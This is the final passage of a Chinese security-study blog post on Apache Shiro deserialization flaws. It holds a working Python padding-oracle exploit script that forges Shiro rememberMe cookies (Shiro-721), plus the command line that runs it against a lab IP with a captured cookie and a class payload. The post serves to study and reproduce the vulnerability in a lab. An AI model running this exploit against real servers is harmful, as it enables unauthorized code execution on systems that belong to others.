+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> paddingoracle <span class="keyword">import</span> BadPaddingException, PaddingOracle</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote, unquote</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PadBuster</span>(<span class="title class_ inherited__">PaddingOracle</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, **kwargs</span>):</span><br><span class="line">        <span class="built_in">super</span>(PadBuster, <span class="variable language_">self</span>).__init__(**kwargs)</span><br><span class="line">        <span class="variable language_">self</span>.session = requests.Session()</span><br><span class="line">        <span class="comment"># self.session.cookies[&#x27;JSESSIONID&#x27;] = &#x27;18fa0f91-625b-4d8b-87db-65cdeff153d0&#x27;</span></span><br><span class="line">        <span class="variable language_">self</span>.wait = kwargs.get(<span class="string">&#x27;wait&#x27;</span>, <span class="number">2.0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">self, data, **kwargs</span>):</span><br><span class="line">        somecookie = b64encode(b64decode(unquote(sys.argv[<span class="number">2</span>])) + data)</span><br><span class="line">        <span class="variable language_">self</span>.session.cookies[<span class="string">&#x27;rememberMe&#x27;</span>] = somecookie</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.session.cookies.get(<span class="string">&#x27;JSESSIONID&#x27;</span>):</span><br><span class="line">            <span class="keyword">del</span> <span class="variable language_">self</span>.session.cookies[<span class="string">&#x27;JSESSIONID&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># logging.debug(self.session.cookies)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                response = <span class="variable language_">self</span>.session.get(sys.argv[<span class="number">1</span>],</span><br><span class="line">                        stream=<span class="literal">False</span>, timeout=<span class="number">5</span>, verify=<span class="literal">False</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> (socket.error, requests.exceptions.RequestException):</span><br><span class="line">                logging.exception(<span class="string">&#x27;Retrying request in %.2f seconds...&#x27;</span>,</span><br><span class="line">                                  <span class="variable language_">self</span>.wait)</span><br><span class="line">                time.sleep(<span class="variable language_">self</span>.wait)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.history.append(response)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># logging.debug(response.headers)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> response.headers.get(<span class="string">&#x27;Set-Cookie&#x27;</span>) <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="string">&#x27;deleteMe&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.headers.get(<span class="string">&#x27;Set-Cookie&#x27;</span>):</span><br><span class="line">            logging.debug(<span class="string">&#x27;No padding exception raised on %r&#x27;</span>, somecookie)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># logging.debug(&quot;Padding exception&quot;)</span></span><br><span class="line">        <span class="keyword">raise</span> BadPaddingException</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> logging</span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> sys.argv[<span class="number">3</span>:]:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Usage: %s &lt;url&gt; &lt;somecookie value&gt; &lt;payload&gt;&#x27;</span> % (sys.argv[<span class="number">0</span>], )</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    logging.basicConfig(level=logging.DEBUG)</span><br><span class="line">    encrypted_cookie = b64decode(unquote(sys.argv[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line">    padbuster = PadBuster()</span><br><span class="line"></span><br><span class="line">    payload = <span class="built_in">open</span>(sys.argv[<span class="number">3</span>], <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">    enc = padbuster.encrypt(plaintext=payload, block_size=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># cookie = padbuster.decrypt(encrypted_cookie, block_size=8, iv=bytearray(8))</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(&#x27;Decrypted somecookie: %s =&gt; %r&#x27; % (sys.argv[1], enc))</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;rememberMe cookies:&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(b64encode(enc))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 shiro_exp.py http://192.168.34.1:8081/ 1Hl09o75rzreK5ohy2jdexgtcs/qNjs2hZM4lA0G9QQzjX5dzggbD9N7trEVAY4S39qPNb6iHMZmYUnh3Hg2ABjJ9lxLybcPs0nCN1xbeiAhHlbR/HPBsIGxUQEuRbeD8JflacXxz/UEBqoy29ay8qZG45uNe0rm48m7X4UVFENA1bgoHUB6M/icpogLzQhpnY2ZN22sejQsCtWMJMQKkiHKAkQXC3lF2feoRbuD1b+KpijMiWc27+m3TfN2ObaSaM6wLPKzFtV8JgkTJbT99tO3Klp8uNFlGy7Kfw+4DoDpQjYmpdvqHlwW6TN2fnu18G4G5ReNRDR4eEt3+6DAoga/bcTRNyu2pRwNJXeJSu4dZyityZviPexm/6QeGvPYR8PTXUCGMpuNyZ8bIHA6buVmGfINFjGnJoqL6ar2t7Tyex8BEvGb/2OpErspQL6C14COfjJDdBQM1ViUn2B257Qw62D9ZYNHscIj0Ntiu/LsflJIZSKoDmZH0EcBjfQF ak.class</span><br></pre></td></tr></table></figure>
+
+<p>得爆一会</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240730164732765.png"
+                        alt="image-20240730164732765"
+                 ></p>
+<p>替换</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240730164828367.png"
+                        alt="image-20240730164828367"
+                 ></p>
+<p>接收到</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240730164755421.png"
+                        alt="image-20240730164755421"
+                 ></p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>其实早分析过了只是期末考试、国赛等等没写文章，其实很多都是参考别的师傅的，目前写文章的主要目的还是为了留存笔记</p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a class="link"   target="_blank" rel="noopener" href="https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/" >Java反序列化Shiro篇01-Shiro550流程分析<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://drun1baby.top/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/" >Java反序列化Shiro篇02-Shiro721流程分析<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8997?time__1311=n4+xnD0DcDRDgD02DUx4BqOoTKq=vWWDIOn0iTD#toc-3" >Shiro反序列化分析带思路及组件检测笔记 - 先知社区 (aliyun.com)<i class="fas fa-external-link-alt"></i></a></p>
+
+                    
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                Java安全Shiro篇
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2026/03/02/Java安全Shiro篇学习/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    作者
+                </div>
+                <div class="content">Nbc</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    发布于
+                </div>
+                <div class="content">2026-03-02 14:23</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    许可
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到 QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="分享到微信"
+            data-tooltip-img-tip="微信扫一扫"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到微博"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2026/03/02/%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9BShiro%E5%88%A9%E7%94%A8/"
+                                   title="遇到的一些Shiro利用"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">遇到的一些Shiro利用</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2026/03/02/Java%E5%8F%8D%E5%B0%84/"
+                                   title="Java安全 JAVA反射"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">Java安全 JAVA反射</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Java%E5%AE%89%E5%85%A8Shiro%E7%AF%87"><span class="nav-text">Java安全Shiro篇</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%86%E8%A7%A3Shiro"><span class="nav-text">了解Shiro</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Shiro%E6%A1%86%E6%9E%B6%E6%A6%82%E8%BF%B0"><span class="nav-text">Shiro框架概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="nav-text">Shiro反序列化漏洞产生的原因</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shiro-550%E5%88%86%E6%9E%90"><span class="nav-text">Shiro-550分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B"><span class="nav-text">分析过程</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8A%A0%E5%AF%86Cookie%E8%BF%87%E7%A8%8B"><span class="nav-text">加密Cookie过程</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%A4%84%E7%90%86Cookie%E8%BF%87%E7%A8%8B"><span class="nav-text">处理Cookie过程</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#URLDNS"><span class="nav-text">URLDNS</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#AES%E5%AF%86%E9%92%A5%E5%88%A4%E6%96%AD"><span class="nav-text">AES密钥判断</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shiro-721%E5%88%86%E6%9E%90"><span class="nav-text">Shiro-721分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-1"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1"><span class="nav-text">漏洞原理</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%8EShiro550%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-text">与Shiro550的区别</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="nav-text">利用条件</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B-1"><span class="nav-text">分析过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Padding-Oracle-Attack"><span class="nav-text">Padding Oracle Attack</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Shiro721%E7%9A%84Padding-Oracle-Attack"><span class="nav-text">Shiro721的Padding Oracle Attack</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0"><span class="nav-text">复现</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%90%8E%E8%AE%B0"><span class="nav-text">后记</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-text">参考文章</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;2026
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">Nbc</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+
+    
+        <div class="count-info info-item">
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Java%E5%AE%89%E5%85%A8Shiro%E7%AF%87"><span class="nav-text">Java安全Shiro篇</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%86%E8%A7%A3Shiro"><span class="nav-text">了解Shiro</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Shiro%E6%A1%86%E6%9E%B6%E6%A6%82%E8%BF%B0"><span class="nav-text">Shiro框架概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="nav-text">Shiro反序列化漏洞产生的原因</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shiro-550%E5%88%86%E6%9E%90"><span class="nav-text">Shiro-550分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B"><span class="nav-text">分析过程</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8A%A0%E5%AF%86Cookie%E8%BF%87%E7%A8%8B"><span class="nav-text">加密Cookie过程</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%A4%84%E7%90%86Cookie%E8%BF%87%E7%A8%8B"><span class="nav-text">处理Cookie过程</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#URLDNS"><span class="nav-text">URLDNS</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#AES%E5%AF%86%E9%92%A5%E5%88%A4%E6%96%AD"><span class="nav-text">AES密钥判断</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shiro-721%E5%88%86%E6%9E%90"><span class="nav-text">Shiro-721分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-1"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1"><span class="nav-text">漏洞原理</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%8EShiro550%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-text">与Shiro550的区别</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="nav-text">利用条件</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B-1"><span class="nav-text">分析过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Padding-Oracle-Attack"><span class="nav-text">Padding Oracle Attack</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Shiro721%E7%9A%84Padding-Oracle-Attack"><span class="nav-text">Shiro721的Padding Oracle Attack</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0"><span class="nav-text">复现</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%90%8E%E8%AE%B0"><span class="nav-text">后记</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-text">参考文章</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/utils.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/header-shrink.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/back2top.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/toggle-theme.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/code-block.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/main.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/libs/anime.min.js"></script>
+
+<!-- local search -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/local-search.min.js"></script>
+
+
+<!-- lazyload -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/lazyload.min.js"></script>
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/post/post-helper.min.js"></script>
+
+        <!-- toc -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/post/toc.min.js"></script>
+        
+
+        <!-- copyright-info -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/post/copyright-info.min.js"></script>
+        
+
+        <!-- share -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/post/share.min.js"></script>
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+    
+        
